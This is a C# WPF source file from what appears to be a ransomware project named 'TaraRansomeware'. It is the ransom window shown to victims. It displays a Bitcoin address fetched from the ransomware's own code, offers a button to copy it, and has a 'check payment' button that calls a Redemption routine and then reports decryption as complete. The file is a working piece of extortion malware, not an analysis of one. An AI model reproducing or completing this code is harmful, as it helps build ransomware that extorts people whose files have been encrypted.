using System;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Windows;

namespace TaraRansomeware
{
    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class MainWindow : Window
    {
        private const string Kernel32_DllName = "kernel32.dll";

        [DllImport(Kernel32_DllName)]
        private static extern bool AllocConsole();

        [DllImport(Kernel32_DllName)]
        private static extern bool FreeConsole();

        public MainWindow()
        {
            InitializeComponent();
        }

        protected override void OnActivated(EventArgs e)
        {
            try
            {
                BtcAddressBox.Text = Ransomeware.BtcAdddress();
                return;
            }
            catch (AggregateException aggregateException)
            {
                aggregateException.Handle((x) =>
                {
                    if (x is HttpRequestException)
                    {
                        return HttpRequestExceptionHandler(x);
                    }
                    else
                    {
                        Debug.WriteLine(x.StackTrace);
                    }
                    return false;
                });
            }
        }

        private void BtnClkCopy(object sender, RoutedEventArgs e)
        {
            Clipboard.SetData(DataFormats.Text, (Object)BtcAddressBox.Text);
        }

        private void CheckPayment_Click(object sender, RoutedEventArgs e)
        {
#if !DEBUG
            AllocConsole();
#endif
            string origin = BtcAddressBox.Text;
            BtcAddressBox.Text = "Processing ...";

            try
            {
                Ransomeware.Redemption();
            }
            catch (AggregateException aggregateException)
            {
                aggregateException.Handle((x) =>
                {
                    if (x is HttpRequestException)
                    {
                        return HttpRequestExceptionHandler(x);
                    }
                    return false;
                });

            }
            finally
            {
                BtcAddressBox.Text = origin;
#if !DEBUG
                FreeConsole();
#endif
            }

            MessageBox.Show("解密完成", "Success", MessageBoxButton.OK, MessageBoxImage.None);
        }

        private bool HttpRequestExceptionHandler(Exception x)
        {
            Debug.WriteLine(x.StackTrace);
            MessageBox.Show(x.Message, "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            Close();

            return false;
        }
    }
}
